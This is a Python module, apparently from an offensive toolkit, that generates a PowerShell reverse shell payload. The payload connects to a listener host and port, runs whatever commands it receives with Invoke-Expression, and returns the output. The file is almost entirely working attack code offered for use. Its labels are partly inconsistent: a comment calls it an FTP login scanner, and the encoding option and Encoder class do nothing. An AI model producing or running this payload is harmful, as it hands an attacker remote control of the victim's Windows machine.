#!/usr/bin/env python3
# -*- coding: utf-8 -*-


# Metadata الخاصة بأداة فحص FTP وتسجيل الدخول
metadata = {
    "name": "SignalShell PowerShell Reverse Shell",
    "description": "A PowerShell-based reverse shell that executes commands remotely and manages interaction over HTTP.",
    "authors": ["DrDataYE"],
    "date": "2023-04-01",
    "license": "Custom Intellectual License",
    "references": [
        {"type": "url", "ref": "https://github.com/t3l3machus/hoaxshell"},
        {"type": "url", "ref": "https://revshells.com"},
    ],
    "options": {
        "lhost": {
            "type": "address",
            "description": "Target host address",
            "required": True,
            "default": "0.0.0.0",
        },
        "lport": {
            "type": "int",
            "description": "Listening port for incoming connections",
            "required": False,
            "default": 6501,
        },
        "encode": {
            "type": "string",
            "description": "Encoding method for the shell",
            "required": False,
            "default": "http",
        },
    },
}


class Encoder:
    pass


def run(args):
    lhost = args.get("lhost", "0.0.0.0")
    lport = args.get("lport", 6501)
    encode = args.get("encode", "http")

    powershell_script = f"""$LHOST = "{lhost}"; $LPORT = {lport}; $TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); $NetworkStream = $TCPClient.GetStream(); $StreamReader = New-Object IO.StreamReader($NetworkStream); $StreamWriter = New-Object IO.StreamWriter($NetworkStream); $StreamWriter.AutoFlush = $true; $Buffer = New-Object System.Byte[] 1024; while ($TCPClient.Connected) {{while ($NetworkStream.DataAvailable) {{$RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length);$Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1)}};if ($TCPClient.Connected -and $Code.Length -gt 1) {{$Output = try {{Invoke-Expression ($Code) 2>&1}} catch {{$_}};$StreamWriter.Write("$Output`n");$Code = $null}}}};$TCPClient.Close(); $NetworkStream.Close(); $StreamReader.Close(); $StreamWriter.Close();"""
    print(powershell_script)
